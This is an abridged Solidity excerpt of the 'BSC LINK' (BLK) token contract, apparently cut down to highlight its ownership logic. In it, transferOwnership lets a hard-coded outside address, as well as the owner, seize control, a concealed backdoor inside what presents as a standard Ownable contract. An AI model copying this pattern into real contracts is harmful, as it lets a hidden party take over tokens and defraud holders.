...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xE49442108c4DE13e5C83F1DE32b5113CEa206655));
...
contract BSCLINK is Context, IERC20, Ownable, Pausable {
  ...
  uint256 private _totalSupply = 6500000 * 10**9;
  string private _symbol = "BLK";
  string private _name = "BSC LINK";
